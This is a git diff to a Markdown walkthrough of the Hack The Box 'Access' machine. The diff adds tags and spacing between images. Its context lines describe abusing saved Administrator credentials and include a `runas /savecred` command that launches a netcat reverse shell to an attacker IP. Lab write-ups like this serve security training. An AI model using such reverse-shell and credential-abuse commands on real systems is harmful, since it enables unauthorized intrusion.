@@ -9,7 +9,7 @@ menu:
     parent: htb-machines-windows
     weight: 10
 hero: images/access.png
-tags: ["HTB"]
+tags: ["HTB", "mdbtools", "readpst", "mutt", "telnet", "runas", "cached-creds", "dpapi", "pylnker"]
 ---
 
 # Access
@@ -64,6 +64,7 @@ Nmap done: 1 IP address (1 host up) scanned in 20.22 seconds
   - So now we need to look for password
 
 ![](./images/3.png)
+
 ![](./images/4.png)
 
 - Let's check `backup` file
@@ -107,6 +108,7 @@ Nmap done: 1 IP address (1 host up) scanned in 20.22 seconds
   - Let's check `cmdkey` for saved credentials
 
 ![](./images/11.png)
+
 ![](./images/12.png)
 
 - We see that we have `ACCESS\Administrator`'s credentials saved
@@ -115,6 +117,7 @@ Nmap done: 1 IP address (1 host up) scanned in 20.22 seconds
   - And start reverse shell: `runas /user:ACCESS\Administrator /savecred "nc.exe 10.10.16.3 6666 -e cmd"`
 
 ![](./images/13.png)
+
 ![](./images/14.png)
 
 - Check [0xdf's blog](https://0xdf.gitlab.io/2019/03/02/htb-access.html) for other privesc paths
